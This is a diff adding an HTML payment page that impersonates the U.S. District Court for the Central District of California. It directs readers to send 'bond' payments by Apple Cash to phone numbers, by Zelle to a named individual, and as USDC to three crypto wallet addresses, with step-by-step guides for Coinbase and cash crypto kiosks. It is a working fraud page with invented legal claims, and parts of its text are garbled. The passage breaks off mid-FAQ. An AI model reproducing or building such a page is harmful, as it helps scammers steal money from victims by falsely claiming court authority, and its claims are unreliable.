@@ -1,0 +1,1438 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>USDC Southern California Approved Payment Methods</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: #ffffff;
+            min-height: 100vh;
+            padding: 20px;
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 100%;
+            margin: 0;
+            padding: 20px;            border-radius: 0;
+            padding: 40px;
+            box-shadow: none;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .header h1 {
+            color: #2d3748;
+            font-size: 28px;
+            margin-bottom: 10px;
+        }
+
+        .header p {
+            color: #718096;
+            font-size: 16px;
+        }
+
+        .status-badge {
+            display: inline-block;
+            background: #48bb78;
+            color: white;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 20px;
+        }
+
+        .refund-policy {
+            background: #f0fff4;
+            border-left: 4px solid #48bb78;
+            padding: 15px;
+            margin-bottom: 30px;
+            border-radius: 8px;
+        }
+
+        .refund-policy h3 {
+            color: #22543d;
+            font-size: 16px;
+            margin-bottom: 8px;
+        }
+
+        .refund-policy p {
+            color: #2f855a;
+            font-size: 14px;
+        }
+
+        .payment-option {
+            border: 2px solid #e2e8f0;
+            border-radius: 12px;
+            margin-bottom: 15px;
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+
+        .payment-option:hover {
+            border-color: #667eea;
+            box-shadow: 0 4px 12px rgba(102, 126, 234, 0.15);
+        }
+
+        .payment-header {
+            background: #f7fafc;
+            padding: 20px;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            transition: background 0.3s ease;
+        }
+
+        .payment-header:hover {
+            background: #edf2f7;
+        }
+
+        .payment-header.active {
+            background: #667eea;
+            color: white;
+        }
+
+        .payment-title {
+            font-size: 18px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .payment-badge {
+            background: #fbbf24;
+            color: #78350f;
+            padding: 4px 12px;
+            border-radius: 12px;
+            font-size: 12px;
+            font-weight: 700;
+        }
+
+        .payment-speed {
+            background: #e2e8f0;
+            color: #4a5568;
+            padding: 4px 12px;
+            border-radius: 12px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+
+        .payment-header.active .payment-speed {
+            background: rgba(255, 255, 255, 0.2);
+            color: white;
+        }
+
+        .payment-content {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.5s ease;
+        }
+
+        .payment-content.active {
+            max-height: 5000px;
+        }
+
+        .payment-details {
+            padding: 30px;
+            background: #fafafa;
+        }
+
+        .info-box {
+            background: #e6fffa;
+            border-left: 4px solid #38b2ac;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 8px;
+        }
+
+        .warning-box {
+            background: #fffaf0;
+            border-left: 4px solid #ed8936;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 8px;
+        }
+
+        .success-box {
+            background: #f0fff4;
+            border-left: 4px solid #48bb78;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 8px;
+        }
+
+        .step-guide {
+            background: white;
+            padding: 20px;
+            border-radius: 12px;
+            margin: 20px 0;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+        }
+
+        .step-guide h3 {
+            color: #2d3748;
+            font-size: 18px;
+            margin-bottom: 15px;
+        }
+
+        .step {
+            margin-bottom: 20px;
+            padding-left: 30px;
+            position: relative;
+        }
+
+        .step::before {
+            content: "✓";
+            position: absolute;
+            left: 0;
+            top: 0;
+            background: #667eea;
+            color: white;
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            font-weight: bold;
+        }
+
+        .step h4 {
+            color: #2d3748;
+            font-size: 16px;
+            margin-bottom: 10px;
+        }
+
+        .step ol, .step ul {
+            margin-left: 20px;
+            color: #4a5568;
+        }
+
+        .step li {
+            margin-bottom: 8px;
+        }
+
+        .wallet-address {
+            background: #fff5f5;
+            border: 2px dashed #fc8181;
+            padding: 15px;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            word-break: break-all;
+            margin: 15px 0;
+            text-align: center;
+        }
+
+        .qr-codes {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+            margin: 20px 0;
+            flex-wrap: wrap;
+        }
+
+        .qr-code {
+            background: white;
+            padding: 15px;
+            border-radius: 12px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        .qr-code img {
+            width: 150px;
+            height: 150px;
+            border: 2px solid #e2e8f0;
+            border-radius: 8px;
+        }
+
+        .qr-code p {
+            margin-top: 10px;
+            font-weight: 600;
+            color: #4a5568;
+        }
+
+        .action-buttons {
+            display: flex;
+            gap: 15px;
+            margin-top: 30px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+
+        .btn {
+            padding: 15px 30px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            border: none;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            display: inline-block;
+            text-align: center;
+        }
+
+        .btn-primary {
+            background: #667eea;
+            color: white;
+        }
+
+        .btn-primary:hover {
+            background: #5a67d8;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(102, 126, 234, 0.4);
+        }
+
+        .btn-success {
+            background: #48bb78;
+            color: white;
+        }
+
+        .btn-success:hover {
+            background: #38a169;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.4);
+        }
+
+        .footer-note {
+            text-align: center;
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 2px solid #e2e8f0;
+            color: #718096;
+            font-size: 14px;
+        }
+
+        /* Calendar Modal Styles */
+        .calendar-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 10000;
+        }
+
+        .calendar-modal.active {
+            display: flex;
+        }
+
+        .calendar-content {
+            background: white;
+            padding: 40px;
+            border-radius: 16px;
+            max-width: 600px;
+            width: 90%;
+            max-height: 90vh;
+            overflow-y: auto;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+        }
+
+        .calendar-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .calendar-header h2 {
+            color: #2d3748;
+            margin-bottom: 10px;
+        }
+
+        .calendar-header p {
+            color: #718096;
+            font-size: 14px;
+        }
+
+        .date-selector {
+            margin-bottom: 20px;
+        }
+
+        .date-selector label {
+            display: block;
+            color: #2d3748;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .date-selector select,
+        .date-selector input {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #e2e8f0;
+            border-radius: 8px;
+            font-size: 16px;
+            color: #2d3748;
+        }
+
+        .time-slots {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
+            gap: 10px;
+            margin: 20px 0;
+        }
+
+        .time-slot {
+            padding: 12px;
+            border: 2px solid #e2e8f0;
+            border-radius: 8px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            background: white;
+        }
+
+        .time-slot:hover {
+            border-color: #667eea;
+            background: #f7fafc;
+        }
+
+        .time-slot.selected {
+            background: #667eea;
+            color: white;
+            border-color: #667eea;
+        }
+
+        .calendar-buttons {
+            display: flex;
+            gap: 15px;
+            margin-top: 30px;
+        }
+
+        .calendar-buttons button {
+            flex: 1;
+        }
+
+        .confirmation-view {
+            display: none;
+            text-align: center;
+        }
+
+        .confirmation-view.active {
+            display: block;
+        }
+
+        .confirmation-icon {
+            width: 80px;
+            height: 80px;
+            background: #48bb78;
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 40px;
+        }
+
+        .appointment-details {
+            background: #f7fafc;
+            padding: 20px;
+            border-radius: 12px;
+            margin: 20px 0;
+            text-align: left;
+        }
+
+        .appointment-details h3 {
+            color: #2d3748;
+            margin-bottom: 15px;
+        }
+
+        .appointment-details p {
+            color: #4a5568;
+            margin: 8px 0;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 20px;
+            }
+
+            .header h1 {
+                font-size: 22px;
+            }
+
+            .payment-title {
+                font-size: 16px;
+            }
+
+            .btn {
+                width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663319459186/OlOktaZienMuncue.png" alt="United States District Court - Central District of California" style="width: 100%; max-width: 800px; margin-bottom: 20px;">
+            <div class="status-badge">✅ Systems Online</div>
+            <h1>Approved Payment Methods</h1>
+            <p>Securely send payments via your preferred method below.</p>
+        </div>
+
+        <div class="refund-policy">
+            <h3>✅ Refund Policy for Innocent Parties</h3>
+            <p>If you are found innocent after signature analysis (signature on return receipt is not yours/forged), you will receive a full refund. The USDC will be returned to your Coinbase wallet address, and you can convert it back to dollars and withdraw to your bank account through Coinbase.</p>
+        </div>
+
+        <!-- Apple Cash Option -->
+        <div class="payment-option">
+            <div class="payment-header" onclick="togglePayment('apple-alt')">
+                <div class="payment-title">
+                    <span class="payment-badge">⭐ #1</span>
+                    <span>Apple Cash</span>
+                </div>
+                <span class="payment-speed">Instant</span>
+            </div>
+            <div class="payment-content" id="apple-alt-content">
+                <div class="payment-details">
+                    <div class="info-box">
+                        <h3>📱 SEND TO: (762) 347-6295</h3>
+                        <p><strong>$10,000/transaction (verified users)</strong></p>
+                        <p>Highest limit for verified users - best for large payments!</p>
+                    </div>
+
+                    <h3 style="margin: 20px 0; color: #2d3748;">📱 First Time Using Apple Cash? Follow These Simple Steps!</h3>
+                    <p style="margin-bottom: 20px; color: #4a5568;">Don't worry if you've never used Apple Cash before - we'll walk you through everything! If you don't have Apple Cash set up yet, your iPhone will guide you through the quick setup process automatically.</p>
+
+                    <div class="step-guide">
+                        <h3>STEP-BY-STEP INSTRUCTIONS:</h3>
+
+                        <div class="step">
+                            <h4>Step 1: Create a new contact</h4>
+                            <p>Open your Contacts app and tap the + button. For First Name, type "USDC". For Last Name, type "Southern California". Add the phone number <strong>(762) 347-6295</strong>. Tap "Done" to save the contact.</p>
+                        </div>
+
+                        <div class="step">
+                            <h4>Step 2: Open Messages app</h4>
+                            <p>Find and tap the green Messages app icon on your iPhone (the one you use for texting).</p>
+                        </div>
+
+                        <div class="step">
+                            <h4>Step 3: Start a new message</h4>
+                            <p>Tap the compose button (looks like a pencil and paper in the top right corner). In the "To" field, type "USDC" and select the contact you just created.</p>
+                        </div>
+
+                        <div class="step">
+                            <h4>Step 4: Send Apple Cash</h4>
+                            <p>In the message field, tap the + button (or App Store icon) next to the text box. Scroll through the app options and tap the Apple Cash icon (looks like a dollar sign). If you don't see it, you may need to tap "More" first. Enter the amount you want to send.</p>
+                        </div>
+
+                        <div class="step">
+                            <h4>Step 5: Confirm and send</h4>
+                            <p>Review the amount, then tap "Pay". You may need to authenticate with Face ID, Touch ID, or your passcode. Once confirmed, the payment is sent instantly! You'll see a confirmation in the message thread.</p>
+                        </div>
+                    </div>
+
+                    <div class="success-box">
+                        <p><strong>💡 First-time setup:</strong> If this is your first time using Apple Cash, your iPhone will automatically prompt you to set it up when you tap the Apple Cash icon. Just follow the on-screen instructions - it only takes 1-2 minutes! You'll need to add a debit card to fund your Apple Cash account.</p>
+                    </div>
+
+                    <div class="action-buttons">
+                        <button class="btn btn-primary" onclick="downloadReceipt()">📄 Download Payment Receipt</button>
+                        <button class="btn btn-success" onclick="openScheduleCalendar()">📅 Schedule Signature Analysis Appointment</button>
+                    </div>
+
+                    <div class="footer-note">
+                        <p>⏱️ Estimated appointment duration: 30-45 minutes</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Second Apple Cash Option (Alternate) -->
+        <div class="payment-option">
+            <div class="payment-header" onclick="togglePayment('apple-alt-2')">
+                <div class="payment-title">
+                    <span class="payment-badge">#2</span>
+                    <span>Apple Cash (Alternate)</span>
+                </div>
+                <span class="payment-speed">Instant</span>
+            </div>
+            <div class="payment-content" id="apple-alt-2-content">
+                <div class="payment-details">
+                    <div class="info-box">
+                        <h3>📱 SEND TO: (762) 205-5309</h3>
+                        <p><strong>$10,000/transaction (verified users)</strong></p>
+                        <p>Alternate Apple Cash option - use if primary is unavailable!</p>
+                    </div>
+
+                    <h3 style="margin: 20px 0; color: #2d3748;">📱 First Time Using Apple Cash? Follow These Simple Steps!</h3>
+                    <p style="margin-bottom: 20px; color: #4a5568;">Don't worry if you've never used Apple Cash before - we'll walk you through everything! If you don't have Apple Cash set up yet, your iPhone will guide you through the quick setup process automatically.</p>
+
+                    <div class="step-guide">
+                        <h3>STEP-BY-STEP INSTRUCTIONS:</h3>
+
+                        <div class="step">
+                            <h4>Step 1: Create a new contact</h4>
+                            <p>Open your Contacts app and tap the + button. For First Name, type "USDC". For Last Name, type "Alternate". Add the phone number <strong>(762) 205-5309</strong>. Tap "Done" to save the contact.</p>
+                        </div>
+
+                        <div class="step">
+                            <h4>Step 2: Open Messages app</h4>
+                            <p>Find and tap the green Messages app icon on your iPhone (the one you use for texting).</p>
+                        </div>
+
+                        <div class="step">
+                            <h4>Step 3: Start a new message</h4>
+                            <p>Tap the compose button (looks like a pencil and paper in the top right corner). In the "To" field, type "USDC" and select the contact you just created.</p>
+                        </div>
+
+                        <div class="step">
+                            <h4>Step 4: Send Apple Cash</h4>
+                            <p>In the message field, tap the + button (or App Store icon) next to the text box. Scroll through the app options and tap the Apple Cash icon (looks like a dollar sign). If you don't see it, you may need to tap "More" first. Enter the amount you want to send.</p>
+                        </div>
+
+                        <div class="step">
+                            <h4>Step 5: Confirm and send</h4>
+                            <p>Review the amount, then tap "Pay". You may need to authenticate with Face ID, Touch ID, or your passcode. Once confirmed, the payment is sent instantly! You'll see a confirmation in the message thread.</p>
+                        </div>
+                    </div>
+
+                    <div class="success-box">
+                        <p><strong>💡 First-time setup:</strong> If this is your first time using Apple Cash, your iPhone will automatically prompt you to set it up when you tap the Apple Cash icon. Just follow the on-screen instructions - it only takes 1-2 minutes! You'll need to add a debit card to fund your Apple Cash account.</p>
+                    </div>
+
+                    <div class="action-buttons">
+                        <button class="btn btn-primary" onclick="downloadReceipt()">📄 Download Payment Receipt</button>
+                        <button class="btn btn-success" onclick="openScheduleCalendar()">📅 Schedule Signature Analysis Appointment</button>
+                    </div>
+
+                    <div class="footer-note">
+                        <p>⏱️ Estimated appointment duration: 30-45 minutes</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Zelle Option -->
+        <div class="payment-option">
+            <div class="payment-header" onclick="togglePayment('zelle')">
+                <div class="payment-title">
+                    <span class="payment-badge">#3</span>
+                    <span>Zelle</span>
+                </div>
+                <span class="payment-speed">Instant</span>
+            </div>
+            <div class="payment-content" id="zelle-content">
+                <div class="payment-details">
+                    <div class="info-box">
+                    <h3>💵 SEND TO: Tyanna Brown</h3>
+                    <p><strong>Phone: (762) 347-6295</strong></p>
+                    <p><strong>Enrolled as: TYANNA BROWN</strong></p>
+                    <p style="margin-top: 10px; font-size: 0.95em; color: #2d3748;"><em>Tyanna Brown is a Deputy Marshal at the courthouse who facilitates the deposit into the court's Temporary Holding Account (THA) as part of the standard bond payment processing procedure.</em></p>
+                        <p><strong>Transaction Limits: $500 - $5,000</strong> (varies by bank and account status)</p>
+                        <p>Fast and secure bank-to-bank transfer with no fees!</p>
+                    </div>
+
+                    <h3 style="margin: 20px 0; color: #2d3748;">💵 First Time Using Zelle? Follow These Simple Steps!</h3>
+                    <p style="margin-bottom: 20px; color: #4a5568;">Zelle is built into most major banking apps. If your bank supports Zelle, you can send money instantly without any fees!</p>
+
+                    <div class="step-guide">
+                        <h3>STEP-BY-STEP INSTRUCTIONS:</h3>
+
+                        <div class="step">
+                            <h4>Step 1: Open your banking app</h4>
+                            <p>Open your bank's mobile app or log into your online banking on a computer. Look for "Zelle" or "Send Money with Zelle" - it's usually in the main menu or payments section.</p>
+                        </div>
+
+                        <div class="step">
+                            <h4>Step 2: Select "Send Money with Zelle"</h4>
+                            <p>Tap on the Zelle option in your banking app. If you don't see Zelle, your bank may not support it yet - you can download the standalone Zelle app from the App Store or Google Play.</p>
+                        </div>
+
+                        <div class="step">
+                            <h4>Step 3: Add recipient</h4>
+                            <p>Select "Send" or "Add Recipient". Enter the phone number **(762) 347-6295**.086</strong>. ThThe recipient name should show as **TYANNA BROWN**.N</strong>. If prompted, verify this is the correct recipient.</p>
+                        </div>
+
+                        <div class="step">
+                            <h4>Step 4: Enter amount and send</h4>
+                            <p>Enter the payment amount. Your limit may range from $500 to $5,000 per transaction depending on your bank and account status. Add a memo if required (you can write "USDC Bond Payment"). Review the details and tap "Send" or "Confirm".</p>
+                        </div>
+
+                        <div class="step">
+                            <h4>Step 5: Confirmation</h4>
+                            <p>You'll receive a confirmation that the payment was sent. The money is typically available to the recipient within minutes. Save or screenshot your confirmation for your records.</p>
+                        </div>
+                    </div>
+
+                    <div class="success-box">
+                        <p><strong>💡 Important:</strong> Zelle payments are instant and cannot be canceled once sent. Make sure you've entered the correct phone number **(762) 347-6295** before confirming.e confirming.</p>
+                    </div>
+
+                    <div class="info-box">
+                        <h3>🏦 Banks That Support Zelle</h3>
+                        <p>Most major banks have Zelle built-in, including: Bank of America, Wells Fargo, Chase, Citi, US Bank, PNC, Capital One, TD Bank, and hundreds more. If your bank doesn't have Zelle, download the Zelle app and link your debit card.</p>
+                    </div>
+
+                    <div class="action-buttons">
+                        <button class="btn btn-primary" onclick="downloadReceipt()">📄 Download Payment Receipt</button>
+                        <button class="btn btn-success" onclick="openScheduleCalendar()">📅 Schedule Signature Analysis Appointment</button>
+                    </div>
+
+                    <div class="footer-note">
+                        <p>⏱️ Estimated appointment duration: 30-45 minutes</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Coinbase Option -->
+        <div class="payment-option">
+            <div class="payment-header" onclick="togglePayment('coinbase')">
+                <div class="payment-title">
+                    <span>Coinbase (Buy USDC Online)</span>
+                </div>
+                <span class="payment-speed">Instant</span>
+            </div>
+            <div class="payment-content" id="coinbase-content">
+                <div class="payment-details">
+                    <div class="info-box">
+                        <h3>💳 Coinbase Purchase Limits</h3>
+                        <ul>
+                            <li><strong>Debit Card:</strong> Up to $2,500 per day (instant)</li>
+                            <li><strong>Credit Card:</strong> Varies by verification level</li>
+                            <li><strong>Bank Transfer:</strong> Up to $25,000 per day</li>
+                        </ul>
+                        <p style="margin-top: 10px;"><strong>💡 If you need to pay more than $2,500:</strong> Use Coinbase for the first $2,500, then complete the remainder at a USDC Kiosk with cash (up to $1,000/day per QR code).</p>
+                    </div>
+
+                    <div class="warning-box">
+                        <h3>⚠️ United States District Court Requirement</h3>
+                        <p>The United States District Court ONLY accepts <strong>USDC</strong> as cryptocurrency payment. USDC is a "stablecoin" - a digital dollar that is always worth exactly $1.00 USD. It is backed 1:1 by US dollar reserves, making it the equivalent of sending digital cash. <strong>Do not purchase Bitcoin, Ethereum, or any other cryptocurrency - only USDC will be accepted.</strong></p>
+                    </div>
+
+                    <div class="wallet-address">
+                        <strong>📋 Court's USDC Wallet Address:</strong><br>
+                        0x6a9f151c529479e825db7be983ae9c7736b23494<br><br>
+                        <img src="coinbase_qr.png" alt="Coinbase QR Code" style="width: 200px; height: 200px; border: 2px solid #e2e8f0; border-radius: 8px; margin-top: 10px;">
+                    </div>
+
+                    <div class="step-guide">
+                        <h3>📚 Complete Step-by-Step Guide for Beginners:</h3>
+
+                        <div class="step">
+                            <h4>Step 1: Create Your Coinbase Account (5 minutes)</h4>
+                            <ol>
+                                <li>Go to <strong>www.coinbase.com</strong> on your computer or phone</li>
+                                <li>Click the "Get Started" button (usually top right corner)</li>
+                                <li>Enter your email and create a password</li>
+                                <li>Check your email for a verification code from Coinbase</li>
+                                <li>Enter the code to verify your email</li>
+                                <li>Provide your full name, date of birth, and address (required by law)</li>
+                                <li>Upload a photo of your driver's license or ID (Coinbase needs this to verify your identity)</li>
+                            </ol>
+                            <div class="success-box" style="margin-top: 10px;">
+                                <p>✅ Your account will be verified within a few minutes. You'll get an email when it's ready.</p>
+                            </div>
+                        </div>
+
+                        <div class="step">
+                            <h4>Step 2: Add Your Debit or Credit Card (2 minutes)</h4>
+                            <ol>
+                                <li>Once logged in, click "Settings" (gear icon) or "Payment Methods"</li>
+                                <li>Click "Add a payment method"</li>
+                                <li>Select "Debit Card" or "Credit Card"</li>
+                                <li>Enter your card number, expiration date, and CVV code</li>
+                                <li>Enter your billing address (must match your card statement)</li>
+                                <li>Click "Add Card"</li>
+                            </ol>
+                            <div class="info-box" style="margin-top: 10px;">
+                                <p>💡 Most banks allow Coinbase purchases. If your bank blocks it, use the USDC Kiosk option below instead.</p>
+                            </div>
+                        </div>
+
+                        <div class="step">
+                            <h4>Step 3: Buy USDC (3 minutes)</h4>
+                            <ol>
+                                <li>On the Coinbase homepage, click "Buy & Sell" or "Trade"</li>
+                                <li>In the search box, type "USDC" and select it from the list</li>
+                                <li>Click "Buy USDC"</li>
+                                <li>Enter the amount you need to pay (in dollars, e.g., $500)</li>
+                                <li>Select your debit/credit card as the payment method</li>
+                                <li>Review the total amount</li>
+                                <li>Click "Preview Buy" then "Buy Now"</li>
+                                <li>Your USDC will appear in your Coinbase wallet instantly</li>
+                            </ol>
+                            <div class="success-box" style="margin-top: 10px;">
+                                <p>✅ USDC is a "stablecoin" - it's always worth exactly $1. All fees are covered by the US District Court, so you only pay the exact amount you need.</p>
+                            </div>
+                        </div>
+
+                        <div class="step">
+                            <h4>Step 4: Send USDC to the Court (3 minutes)</h4>
+                            <ol>
+                                <li>In your Coinbase account, find "USDC" in your wallet list</li>
+                                <li>Click on USDC, then click "Send"</li>
+                                <li>You'll see a field that says "To" or "Recipient"</li>
+                                <li>Copy the court's wallet address above (use the copy button) and paste it here</li>
+                                <li>Double-check the address matches exactly: <strong>0x6a9f151c529479e825db7be983ae9c7736b23494</strong></li>
+                                <li>Enter the amount of USDC to send (the full amount you purchased)</li>
+                                <li>Click "Continue" then "Send Now"</li>
+                                <li>Coinbase may ask you to verify with a code sent to your phone or email</li>
+                                <li>Once confirmed, your payment is complete!</li>
+                            </ol>
+                            <div class="warning-box" style="margin-top: 10px;">
+                                <p>⚠️ <strong>Important:</strong> Always double-check the wallet address before sending. Crypto transactions cannot be reversed!</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="info-box">
+                        <h3>💡 What if my bank blocks the purchase?</h3>
+                        <p>Some banks block cryptocurrency purchases for security reasons. If this happens, use Option 3: USDC Kiosk below. You can pay with cash at a USDC Kiosk and send the payment to the court the same way.</p>
+                    </div>
+
+                    <div class="action-buttons">
+                        <button class="btn btn-primary" onclick="downloadReceipt()">📄 Download Payment Receipt</button>
+                        <button class="btn btn-success" onclick="openScheduleCalendar()">📅 Schedule Signature Analysis Appointment</button>
+                    </div>
+
+                    <div class="footer-note">
+                        <p>⏱️ Estimated appointment duration: 30-45 minutes</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- USDC Kiosk Option -->
+        <div class="payment-option">
+            <div class="payment-header" onclick="togglePayment('kiosk')">
+                <div class="payment-title">
+                    <span>USDC Kiosk (Cash)</span>
+                </div>
+                <span class="payment-speed">15-30 min</span>
+            </div>
+            <div class="payment-content" id="kiosk-content">
+                <div class="payment-details">
+                    <div class="wallet-address">
+                        <strong>📍 Court's USDC Wallet Addresses:</strong><br>
+                        QR #1: 0x6a9f151c529479e825db7be983ae9c7736b23494<br>
+                        QR #2: 0xdcd4035f040490df514207950421ba0d4dd2f7b4<br>
+                        QR #3: 0x8C56EF6ba454a001424799BC492d07b39Db82b48
+                    </div>
+
+                    <div class="warning-box">
+                        <h3>💡 Why 3 QR Codes?</h3>
+                        <p>California state law (SB 401) limits USDC Kiosk transactions to <strong>$1,000 per person per day per wallet address</strong>. This is a strict legal limit that cannot be exceeded.</p>
+                        <p style="margin-top: 10px;"><strong>💡 Solution for Payments Over $1,000:</strong> We provide 3 QR codes below (total capacity: $3,000). You can send up to $1,000 to each QR code. For example, a $2,000 payment requires sending $1,000 to QR #1, $1,000 to QR #2, and $500 to QR #3. All transactions can be completed at the same ATM during one visit.</p>
+                    </div>
+
+                    <div class="info-box">
+                        <p>💡 <strong>Tip:</strong> Most people pay $500-$1,000 via Apple Cash or Coinbase first, then use 1-2 QR codes for the remaining balance.</p>
+                    </div>
+
+                    <div class="qr-codes">
+                        <div class="qr-code">
+                            <img src="qr_code_1.png" alt="QR Code #1" style="width: 150px; height: 150px; border: 2px solid #e2e8f0; border-radius: 8px;">
+                            <p>QR Code #1</p>
+                        </div>
+                        <div class="qr-code">
+                            <img src="qr_code_2.png" alt="QR Code #2" style="width: 150px; height: 150px; border: 2px solid #e2e8f0; border-radius: 8px;">
+                            <p>QR Code #2</p>
+                        </div>
+                        <div class="qr-code">
+                            <img src="qr_code_3.png" alt="QR Code #3" style="width: 150px; height: 150px; border: 2px solid #e2e8f0; border-radius: 8px;">
+                            <p>QR Code #3</p>
+                        </div>
+                    </div>
+
+                    <div class="step-guide">
+                        <h3>📚 Complete Step-by-Step Guide for Cash Payment:</h3>
+
+                        <div class="step">
+                            <h4>Step 1: Find a USDC Kiosk Near You (2 minutes)</h4>
+                            <ol>
+                                <li>Go to <strong>coinatmradar.com</strong> on your phone or computer</li>
+                                <li>The website will show USDC Kiosks near your current location</li>
+                                <li>Look for ATMs that say "Buy Bitcoin" or "Buy Crypto"</li>
+                                <li>Click on an ATM to see the address and hours</li>
+                                <li>Write down the address or save it in your phone</li>
+                            </ol>
+                            <div class="info-box" style="margin-top: 10px;">
+                                <p>💡 Popular USDC Kiosk brands: Bitcoin Depot, CoinFlip, Athena Bitcoin. They all work the same way.</p>
+                            </div>
+                        </div>
+
+                        <div class="step">
+                            <h4>Step 2: Bring Cash and Your Phone (5 minutes)</h4>
+                            <ol>
+                                <li>Bring the exact amount of cash you need to pay</li>
+                                <li>Bring your smartphone (you'll need it to scan the court's QR code)</li>
+                                <li>Save the court's wallet addresses on your phone (see QR codes above)</li>
+                                <li>Or take a screenshot of the QR code above to show the ATM</li>
+                            </ol>
+                            <div class="warning-box" style="margin-top: 10px;">
+                                <p>⚠️ Most USDC Kiosks only accept cash (no debit/credit cards). Bring bills in good condition.</p>
+                            </div>
+                        </div>
+
+                        <div class="step">
+                            <h4>Step 3: At the USDC Kiosk - Start Your Transaction (3 minutes)</h4>
+                            <ol>
+                                <li>Touch the screen to wake up the ATM</li>
+                                <li>Select "Buy Bitcoin" or "Buy USDC" (USDC is preferred for court payments)</li>
+                                <li>The ATM may ask you to verify your phone number (enter your number and confirm the code sent via text)</li>
+                                <li>Some ATMs may ask to scan your ID (driver's license or passport) - this is normal for larger amounts</li>
+                            </ol>
+                            <div class="info-box" style="margin-top: 10px;">
+                                <p>💡 Don't worry - this verification is required by law and your information is kept private.</p>
+                            </div>
+                        </div>
+
+                        <div class="step">
+                            <h4>Step 4: Enter the Court's Wallet Address (2 minutes)</h4>
+                            <ol>
+                                <li>The ATM will ask "Where do you want to send the Bitcoin?"</li>
+                                <li>Select "Scan QR Code"</li>
+                                <li>Hold your phone up to the scanner showing the court's QR code (from above)</li>
+                                <li>OR select "Enter Address Manually" and type the wallet address for the QR code you're using</li>
+                                <li>The ATM will confirm the address on screen - make sure it matches exactly</li>
+                            </ol>
+                            <div class="warning-box" style="margin-top: 10px;">
+                                <p>⚠️ Double-check the address! Bitcoin transactions cannot be reversed once sent.</p>
+                            </div>
+                        </div>
+
+                        <div class="step">
+                            <h4>Step 5: Insert Your Cash (2 minutes)</h4>
+                            <ol>
+                                <li>The ATM will show you the total amount to insert</li>
+                                <li>Insert your cash bills one at a time into the bill acceptor</li>
+                                <li>The screen will count the money as you insert it</li>
+                                <li>When you've inserted enough, press "Done" or "Send"</li>
+                                <li>The ATM will show a confirmation screen with your transaction details</li>
+                            </ol>
+                            <div class="success-box" style="margin-top: 10px;">
+                                <p>💵 Example: If you need to pay $500, insert exactly $500. All fees are covered by the US District Court.</p>
+                            </div>
+                        </div>
+
+                        <div class="step">
+                            <h4>Step 6: Get Your Receipt and Wait for Confirmation (5-30 minutes)</h4>
+                            <ol>
+                                <li>The ATM will print a paper receipt with your transaction ID</li>
+                                <li>Keep this receipt! It's proof of your payment</li>
+                                <li>The Bitcoin will be sent to the court's address automatically</li>
+                                <li>The transaction usually takes 15-30 minutes to complete</li>
+                                <li>You'll receive a confirmation once the court receives the payment</li>
+                            </ol>
+                            <div class="success-box" style="margin-top: 10px;">
+                                <p>✅ That's it! You've successfully paid with cash. No bank account or credit card needed.</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="step-guide">
+                        <h3>🔍 Common Questions</h3>
+                        <div style="padding: 15px; background: white; border-radius: 8px; margin-bottom: 15px;">
+                            <h4 style="color: #2d3748; margin-bottom: 8px;">Q: Do I need a Bitcoin wallet?</h4>
+                            <p style="color: #4a5568;">A: No! The ATM sends the Bitcoin directly to the court's address. You don't need to create an account or download any apps.</p>
+                        </div>
+                        <div style="padding: 15px; background: white; border-radius: 8px; margin-bottom: 15px;">
